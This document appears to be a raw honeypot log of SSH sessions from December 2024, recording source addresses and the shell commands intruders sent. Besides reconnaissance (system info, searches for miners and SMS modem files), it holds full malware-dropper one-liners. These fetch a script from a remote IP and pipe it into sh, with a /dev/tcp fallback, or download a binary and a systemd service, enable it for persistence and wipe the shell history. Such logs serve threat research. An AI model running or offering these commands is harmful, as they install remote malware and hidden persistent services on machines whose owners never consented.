start
2024-12-07 13:14:24.843379 - ('116.38.82.130', 47489) - /ip cloud print
2024-12-07 13:14:26.095381 - ('116.38.82.130', 47489) - ifconfig
2024-12-07 13:14:27.119247 - ('116.38.82.130', 47489) - uname -a
2024-12-07 13:14:28.143317 - ('116.38.82.130', 47489) - cat /proc/cpuinfo
2024-12-07 13:14:29.167133 - ('116.38.82.130', 47489) - ps | grep '[Mm]iner'
2024-12-07 13:14:30.191179 - ('116.38.82.130', 47489) - ps -ef | grep '[Mm]iner'
2024-12-07 13:14:31.215250 - ('116.38.82.130', 47489) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 13:14:32.239000 - ('116.38.82.130', 47489) - echo Hi | cat -n
2024-12-07 13:17:34.216502 - ('87.120.113.231', 35552) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-07 15:15:44.001252 - ('87.120.113.231', 34440) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-07 17:07:09.588131 - ('119.68.207.74', 42304) - /ip cloud print
2024-12-07 17:07:10.696068 - ('119.68.207.74', 42304) - ifconfig
2024-12-07 17:07:11.600145 - ('119.68.207.74', 42304) - uname -a
2024-12-07 17:07:12.504109 - ('119.68.207.74', 42304) - cat /proc/cpuinfo
2024-12-07 17:07:13.407947 - ('119.68.207.74', 42304) - ps | grep '[Mm]iner'
2024-12-07 17:07:14.311837 - ('119.68.207.74', 42304) - ps -ef | grep '[Mm]iner'
2024-12-07 17:07:15.215876 - ('119.68.207.74', 42304) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 17:07:16.119946 - ('119.68.207.74', 42304) - echo Hi | cat -n
2024-12-07 18:25:29.975091 - ('119.68.175.2', 40781) - /ip cloud print
2024-12-07 18:25:31.155081 - ('119.68.175.2', 40781) - ifconfig
2024-12-07 18:25:32.119147 - ('119.68.175.2', 40781) - uname -a
2024-12-07 18:25:33.078922 - ('119.68.175.2', 40781) - cat /proc/cpuinfo
2024-12-07 18:25:34.038922 - ('119.68.175.2', 40781) - ps | grep '[Mm]iner'
2024-12-07 18:25:34.998879 - ('119.68.175.2', 40781) - ps -ef | grep '[Mm]iner'
2024-12-07 18:25:35.958850 - ('119.68.175.2', 40781) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-07 18:25:36.918800 - ('119.68.175.2', 40781) - echo Hi | cat -n
2024-12-07 18:31:03.377381 - ('195.178.110.6', 50144) - apt
2024-12-07 18:31:04.483248 - ('195.178.110.6', 50144) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:31:12.375601 - ('195.178.110.6', 45792) - apt
2024-12-07 18:31:13.817524 - ('195.178.110.6', 45792) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:31:21.103894 - ('195.178.110.6', 45802) - apt
2024-12-07 18:31:22.447350 - ('195.178.110.6', 45802) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:31:30.317832 - ('195.178.110.6', 44830) - apt
2024-12-07 18:31:31.775212 - ('195.178.110.6', 44830) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:31:39.761076 - ('195.178.110.6', 45036) - apt
2024-12-07 18:31:41.237229 - ('195.178.110.6', 45036) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:31:48.153964 - ('195.178.110.6', 57718) - apt
2024-12-07 18:31:49.243678 - ('195.178.110.6', 57718) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:31:56.411547 - ('195.178.110.6', 57458) - apt
2024-12-07 18:31:57.589766 - ('195.178.110.6', 57458) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:05.345699 - ('195.178.110.6', 58204) - apt
2024-12-07 18:32:06.817350 - ('195.178.110.6', 58204) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:13.722806 - ('195.178.110.6', 46660) - apt
2024-12-07 18:32:14.837523 - ('195.178.110.6', 46660) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:21.764632 - ('195.178.110.6', 52748) - apt
2024-12-07 18:32:23.324796 - ('195.178.110.6', 52748) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:31.384108 - ('195.178.110.6', 52752) - apt
2024-12-07 18:32:32.885354 - ('195.178.110.6', 52752) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:41.851043 - ('195.178.110.6', 35818) - apt
2024-12-07 18:32:43.381634 - ('195.178.110.6', 35818) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:50.566631 - ('195.178.110.6', 56906) - apt
2024-12-07 18:32:51.739396 - ('195.178.110.6', 56906) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:32:58.815393 - ('195.178.110.6', 53804) - apt
2024-12-07 18:32:59.945431 - ('195.178.110.6', 53804) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:33:07.102518 - ('195.178.110.6', 50152) - apt
2024-12-07 18:33:08.227894 - ('195.178.110.6', 50152) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:33:15.534817 - ('195.178.110.6', 44958) - apt
2024-12-07 18:33:16.702751 - ('195.178.110.6', 44958) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:33:24.310328 - ('195.178.110.6', 39690) - apt
2024-12-07 18:33:25.545238 - ('195.178.110.6', 39690) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:33:32.856230 - ('195.178.110.6', 36942) - apt
2024-12-07 18:33:33.907267 - ('195.178.110.6', 36942) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:33:41.730435 - ('195.178.110.6', 52576) - apt
2024-12-07 18:33:43.173517 - ('195.178.110.6', 52576) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 18:33:51.518235 - ('195.178.110.6', 52590) - apt
2024-12-07 18:33:52.989164 - ('195.178.110.6', 52590) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
